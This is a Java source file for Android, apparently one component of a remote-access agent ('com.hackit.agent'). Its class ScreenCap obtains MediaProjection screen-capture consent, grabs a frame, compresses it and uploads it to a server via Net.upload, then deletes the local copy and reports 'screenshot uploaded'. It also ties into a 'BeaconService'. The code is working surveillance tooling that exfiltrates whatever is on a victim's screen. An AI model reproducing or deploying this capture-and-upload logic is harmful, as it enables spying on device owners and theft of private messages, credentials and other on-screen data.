package com.hackit.agent;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

/**
 * MediaProjection screen capture. Consent is per-projection on Android 14, so
 * a missing projection opens the consent activity and the capture resumes from
 * {@link MainActivity#onActivityResult}.
 */
final class ScreenCap {
    static final int REQUEST = 0x5F1A;
    private static volatile MediaProjection projection;
    private static volatile ImageReader reader;
    private static volatile VirtualDisplay display;
    private static volatile boolean live;

    static boolean available() {
        return projection != null;
    }

    static void request(Activity activity) {
        try {
            MediaProjectionManager manager = (MediaProjectionManager)
                    activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (manager == null) {
                return;
            }
            activity.startActivityForResult(manager.createScreenCaptureIntent(), REQUEST);
        } catch (Throwable exc) {
            Log.e("projection request: " + exc);
        }
    }

    static void attach(Context ctx, int resultCode, Intent data) {
        try {
            MediaProjectionManager manager = (MediaProjectionManager)
                    ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (manager == null || data == null) {
                return;
            }
            if (projection != null) {
                teardown();
            }
            projection = manager.getMediaProjection(resultCode, data);
            live = true;
            BeaconService.upgrade(ctx);
            Log.d("projection attached");
        } catch (Throwable exc) {
            Log.e("projection attach: " + exc);
        }
    }

    /** Captures one frame to a JPEG file. Returns null when unavailable. */
    static File frame(Context ctx) {
        MediaProjection mediaProjection = projection;
        if (mediaProjection == null) {
            return null;
        }
        ImageReader localReader = null;
        VirtualDisplay localDisplay = null;
        try {
            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            if (Build.VERSION.SDK_INT >= 30 && ctx.getDisplay() != null) {
                ctx.getDisplay().getRealMetrics(metrics);
            } else if (wm != null) {
                //noinspection deprecation
                wm.getDefaultDisplay().getRealMetrics(metrics);
            }
            int width = Math.max(1, metrics.widthPixels);
            int height = Math.max(1, metrics.heightPixels);
            int dpi = metrics.densityDpi;

            localReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            reader = localReader;
            localDisplay = mediaProjection.createVirtualDisplay(
                    "frames", width, height, dpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    localReader.getSurface(), null, null);
            display = localDisplay;

            Bitmap bitmap = null;
            long deadline = System.currentTimeMillis() + 6000L;
            while (System.currentTimeMillis() < deadline) {
                Image image = localReader.acquireLatestImage();
                if (image != null) {
                    bitmap = toBitmap(image, width, height);
                    image.close();
                    if (bitmap != null) {
                        break;
                    }
                } else {
                    Thread.sleep(120L);
                }
            }
            if (bitmap == null) {
                return null;
            }
            File file = new File(ctx.getCacheDir(), "screen-" + System.currentTimeMillis() + ".jpg");
            FileOutputStream out = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 55, out);
            out.flush();
            out.close();
            bitmap.recycle();
            return file;
        } catch (Throwable exc) {
            Log.d("frame: " + exc);
            return null;
        } finally {
            if (localDisplay != null) {
                localDisplay.release();
            }
            if (localReader != null) {
                localReader.close();
            }
        }
    }

    /** Captures one frame and uploads it as a PNG. */
    static String capture(Context ctx) {
        File file = frame(ctx);
        if (file == null) {
            return "no projection — consent needed (open the app)";
        }
        boolean sent = Net.upload(ctx, file, file.getName(), "screen");
        //noinspection ResultOfMethodCallIgnored
        file.delete();
        return sent ? "screenshot uploaded" : "screenshot captured, upload failed";
    }

    private static Bitmap toBitmap(Image image, int width, int height) {
        try {
            Image.Plane plane = image.getPlanes()[0];
            ByteBuffer buffer = plane.getBuffer();
            int pixelStride = plane.getPixelStride();
            int rowStride = plane.getRowStride();
            int rowPadding = rowStride - pixelStride * width;
            int paddedWidth = width + rowPadding / pixelStride;
            Bitmap padded = Bitmap.createBitmap(paddedWidth, height, Bitmap.Config.ARGB_8888);
            padded.copyPixelsFromBuffer(buffer);
            Bitmap cropped = Bitmap.createBitmap(padded, 0, 0, width, height);
            if (cropped != padded) {
                padded.recycle();
            }
            return cropped;
        } catch (Throwable exc) {
            Log.d("bitmap: " + exc);
            return null;
        }
    }

    static void teardown() {
        try {
            if (display != null) {
                display.release();
            }
            if (reader != null) {
                reader.close();
            }
            if (projection != null) {
                projection.stop();
            }
        } catch (Throwable ignored) {
        }
        display = null;
        reader = null;
        projection = null;
        live = false;
    }

    static boolean live() {
        return live;
    }

    private ScreenCap() {
    }
}
